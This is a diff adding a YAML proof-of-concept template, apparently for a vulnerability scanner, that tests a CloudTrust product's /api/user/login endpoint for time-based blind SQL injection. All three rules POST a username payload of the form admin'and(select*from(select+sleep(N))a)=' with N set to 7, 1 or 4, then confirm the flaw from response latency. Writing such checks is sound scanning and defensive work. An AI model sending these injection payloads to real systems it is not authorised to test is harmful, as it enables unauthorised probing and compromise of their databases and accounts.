@@ -1,0 +1,39 @@
+name: poc-yaml-cloudtrust-sql-bind
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /api/user/login
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(7))a)='
+            follow_redirects: false
+        expression: response.latency >= 7000 && response.latency <= 10000
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /api/user/login
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(1))a)='
+            follow_redirects: false
+        expression: response.latency >= 1000 && response.latency <= 4000
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /api/user/login
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(4))a)='
+            follow_redirects: false
+        expression: response.latency >= 4000 && response.latency <= 7000
+expression: r0() && r1() && r2()
+detail:
+    author: 小r
+    links:
+        - https://www.cloudtrust.com.cn/product/jingyun.html
